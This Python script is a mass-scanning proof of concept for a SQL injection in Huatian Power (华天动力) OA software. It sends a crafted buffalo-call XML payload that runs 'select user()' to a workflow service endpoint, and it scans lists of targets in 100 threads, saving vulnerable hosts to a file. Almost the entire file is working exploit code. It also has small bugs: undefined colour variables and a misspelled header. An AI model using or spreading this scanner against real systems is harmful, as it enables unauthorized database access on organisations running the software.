#导包
import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() 

def banner():
    banner = ''' 

'''
    print(banner)
def poc(target):
    url = target+"/OAapp/bfapp/buffalo/workFlowService"
    headers={
            "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "AAccept-Encoding":"identity",
            "Content-Length":"103",
            "Accept-Language":"zh-CN,zh;q=0.8",
            "Accept":"*/*",
            "Accept-Charset":"GBK,utf-8;q=0.7,*;q=0.3",
            "Connection":"keep-alive",
            "Referer":"http://www.baidu.com",
            "Cache-Control":"max-age=0",
            }
    res = ""
    data = "<buffalo-call> \r\n<method>getDataListForTree</method> \r\n<string>select user()</string> \r\n</buffalo-call>"
    try:
        res = requests.post(url,headers=headers,verify=False,timeout=5,data=data)
        if "root" in res.text:
            print(f"{GREEN}[+]{target}存在SQL注入漏洞{RESET}")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print("[-] 不存在SQL注入漏洞")
    except:
        print("[*] 无法访问")
def main():
    banner()
    parser = argparse.ArgumentParser(description='华天动力oa SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__': 
    main() 